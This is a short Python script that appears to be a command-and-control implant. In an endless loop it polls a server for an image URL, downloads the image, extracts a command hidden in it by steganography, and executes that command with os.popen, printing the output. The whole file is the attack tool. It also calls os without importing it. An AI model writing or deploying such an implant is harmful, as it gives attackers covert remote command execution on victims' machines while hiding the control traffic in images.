import time, requests
from modules.stego import extract_payload_from_image

def fetch_and_execute(image_url):
    r = requests.get(image_url)
    with open("temp.png", "wb") as f:
        f.write(r.content)
    cmd = extract_payload_from_image("temp.png")
    print(f"[+] Command received: {cmd}")
    try:
        out = os.popen(cmd).read()
        print(f"[+] Output:\\n{out}")
    except Exception as e:
        print(f"[!] Error executing command: {e}")

while True:
    try:
        r = requests.get("http://localhost:5000/get_image").json()
        if "image_url" in r:
            fetch_and_execute(r["image_url"])
    except:
        pass
    time.sleep(10)
